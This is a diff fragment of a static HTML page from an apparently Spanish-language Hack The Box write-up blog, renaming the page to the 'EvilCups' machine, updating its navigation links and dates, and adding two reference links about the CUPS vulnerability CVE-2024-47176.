+<li><a href="https://www.hackthebox.com/blog/cve-2024-47176-cups-vulnerability-explained" target="_blank">https://www.hackthebox.com/blog/cve-2024-47176-cups-vulnerability-explained</a></li>
+<li><a href="https://www.evilsocket.net/2024/09/26/Attacking-UNIX-systems-via-CUPS-Part-I/" target="_blank">https://www.evilsocket.net/2024/09/26/Attacking-UNIX-systems-via-CUPS-Part-I/</a></li>
+</ul>
 
           
           
@@ -818,8 +893,8 @@
           
         
       <script>
-        var oid = "views_HTB\/Maquinas\/codify.md"
-        var oid_likes = "likes_HTB\/Maquinas\/codify.md"
+        var oid = "views_HTB\/Maquinas\/EvilCups.md"
+        var oid_likes = "likes_HTB\/Maquinas\/EvilCups.md"
       </script>
       
       
@@ -839,7 +914,7 @@
       <div class="flex justify-between pt-3">
         <span>
           
-            <a class="flex group mr-3" href="/htb/maquinas/stocker/">
+            <a class="flex group mr-3" href="/htb/maquinas/codify/">
               <span
                 class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
                 >&larr;</span
@@ -851,11 +926,11 @@
               <span class="flex flex-col">
                 <span
                   class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
-                  >Stocker</span
+                  >Codify</span
                 >
                 <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
                   
-                    <time datetime="2025-02-22T00:04:43-05:00">22 febrero 2025</time>
+                    <time datetime="2025-03-07T00:04:43-05:00">7 marzo 2025</time>
                   
                 </span>
               </span>
@@ -863,28 +938,6 @@
           
         </span>
         <span>
-          
-            <a class="flex text-right group ml-3" href="/htb/maquinas/evilcups/">
-              <span class="flex flex-col">
-                <span
-                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
-                  >EvilCups</span
-                >
-                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
-                  
-                    <time datetime="2025-03-11T17:00:00-05:00">11 marzo 2025</time>
-                  
-                </span>
-              </span>
-              <span
-                class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
-                >&rarr;</span
-              >
-              <span
-                class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400"
-                >&larr;</span
-              >
-            </a>
           
         </span>
       </div>
